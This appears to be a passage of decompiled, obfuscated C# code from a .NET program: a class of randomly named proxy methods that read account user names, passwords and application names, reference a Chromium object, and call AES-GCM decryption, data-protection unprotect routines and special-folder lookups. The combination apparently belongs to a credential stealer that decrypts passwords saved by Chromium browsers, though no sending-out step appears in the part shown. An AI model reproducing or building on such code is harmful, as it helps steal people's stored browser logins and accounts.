		return nCP5vtxT3QjsSeuiK3.xuCtsHmOK(P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object yiVB7uPVXy3e6CvqIa9(object P_0, object P_1, object P_2)
	{
		return Dj4213xogb3ONhNxwgn.IrTxr5idK((string)P_0, (string)P_1, (Dj4213xogb3ONhNxwgn)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object x2VFN3P182Znyg825x1(object P_0, object P_1, object P_2)
	{
		return vBZLyocWST46tXrDuXU.IrTxr5idK(P_0, (string)P_1, (vBZLyocWST46tXrDuXU)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object PGa56VPwisAetu49Oec(object P_0)
	{
		return ((Account)P_0).UserName;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object Nymob3PUyjF9BKEqJqe(object P_0, object P_1, object P_2, object P_3)
	{
		return X5JsOZcv5rIRXCyIseC.IrTxr5idK((string)P_0, (string)P_1, (string)P_2, (X5JsOZcv5rIRXCyIseC)P_3);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object UxXknUPpWahIvMbH271(object P_0)
	{
		return ((Account)P_0).Password;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object ON5nj1P8OqqwZLbtOuP(object P_0)
	{
		return ((Account)P_0).Application;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool rW22YYPTcT3olKPpw7y()
	{
		return oQH3bGPAigOIV0TsobU == null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static Chromium hOSumfPOH9XmL1q9SP0()
	{
		return oQH3bGPAigOIV0TsobU;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void sBSy8RPjJSao1EHwiOg(object P_0, int P_1, object P_2, int P_3, int P_4, object P_5)
	{
		jEIqK0ciOAYXZS5sdXD.IrTxr5idK((Array)P_0, P_1, (Array)P_2, P_3, P_4, (jEIqK0ciOAYXZS5sdXD)P_5);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object Ls2WIgPlao3C2skGNAJ(object P_0)
	{
		return gRnjGrxKdWbynd12Ef3.IrTxr5idK((gRnjGrxKdWbynd12Ef3)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object wWVJJGPkQlDS4NKbxUX(object P_0, object P_1, object P_2, object P_3, object P_4, object P_5)
	{
		return ((AesGcm)P_0).Decrypt((byte[])P_1, (byte[])P_2, (byte[])P_3, (byte[])P_4, (byte[])P_5);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object oW0S7QPWCRuFFwWOYHd(object P_0, object P_1, object P_2)
	{
		return JVKpD1ccnUX1e3koAjr.IrTxr5idK(P_0, (byte[])P_1, (JVKpD1ccnUX1e3koAjr)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object LpNuNpP2SKCtcVQMYjY(object P_0, object P_1)
	{
		return JB4J6pqWfLbCbJXTau.IrTxr5idK(P_0, (JB4J6pqWfLbCbJXTau)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void yC7EsnPIUKFe1pLh86n(object P_0, object P_1)
	{
		LImh5dcp5uP6SL0MSxo.IrTxr5idK((string)P_0, (LImh5dcp5uP6SL0MSxo)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool Gq5sxTPQZGqrjY8Ptn4(object P_0, object P_1)
	{
		return fiM4Hw9Fl6DhXSwmaZ.IrTxr5idK((string)P_0, (fiM4Hw9Fl6DhXSwmaZ)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object T3J3iIPYTplRuU7hsoO(object P_0, object P_1)
	{
		return e48Rc6xALatw3CN0lFC.IrTxr5idK((string)P_0, (e48Rc6xALatw3CN0lFC)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object ETTxDpPadcHq9Q9nRRO(object P_0, object P_1, object P_2)
	{
		return ituSE6HG3nGarEfsJox.IrTxr5idK(P_0, (string)P_1, (ituSE6HG3nGarEfsJox)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool HrNlFBPS7K2wsUoYmgb(object P_0, object P_1)
	{
		return WgTYYbJRKwFExGPhGv.IrTxr5idK(P_0, (WgTYYbJRKwFExGPhGv)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object MuRLVOPgn8r9QuTb2SI(object P_0, object P_1)
	{
		return vTs60yHrNaPomKy60dK.IrTxr5idK(P_0, (vTs60yHrNaPomKy60dK)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object YAkQemPCAJkpSYABQ9m(object P_0, int P_1, object P_2)
	{
		return vfBAasHEB6dffogKCXX.IrTxr5idK(P_0, P_1, (vfBAasHEB6dffogKCXX)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object t0ZjqGPLGysLpN5JBi5(object P_0, object P_1)
	{
		return okBb41xVk47CJ0uunIs.IrTxr5idK((string)P_0, (okBb41xVk47CJ0uunIs)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void k5T4j8P5jO2XXv8imUK(object P_0, object P_1)
	{
		hp2t4AvvrAe21OV5Ii.IrTxr5idK(P_0, (hp2t4AvvrAe21OV5Ii)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object DrmVBGPEkhyNIrF26o7(object P_0, object P_1, DataProtectionScope P_2, object P_3)
	{
		return muAo9tH2M09galWEihj.IrTxr5idK((byte[])P_0, (byte[])P_1, P_2, (muAo9tH2M09galWEihj)P_3);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int XTWcJhPxGrVWijEjsVK(object P_0, object P_1)
	{
		return ufQl9lHBULVUQ1TPAER.IrTxr5idK(P_0, (ufQl9lHBULVUQ1TPAER)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object PctqJBP04uBINpliaIZ(object P_0, object P_1, object P_2)
	{
		return lvfeUdxdotHleo5TGFR.IrTxr5idK(P_0, (string)P_1, (lvfeUdxdotHleo5TGFR)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object teRMNHPeCG99YV5cyxt(object P_0)
	{
		return xhf0UNcTnQ6uV2PN1fR.IrTxr5idK((xhf0UNcTnQ6uV2PN1fR)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object J0Z1qkPsKM6q52QYrbN(object P_0)
	{
		return ((List<string>)P_0).ToArray();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void gevT3nPtg94dR1yDmjb()
	{
		WkMgYHbfSUMGdoITRx.meR4IDkzWCCfY();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object h6tDTePF2jW9WmPQnvP(Environment.SpecialFolder P_0)
	{
		return Environment.GetFolderPath(P_0);
	}
}
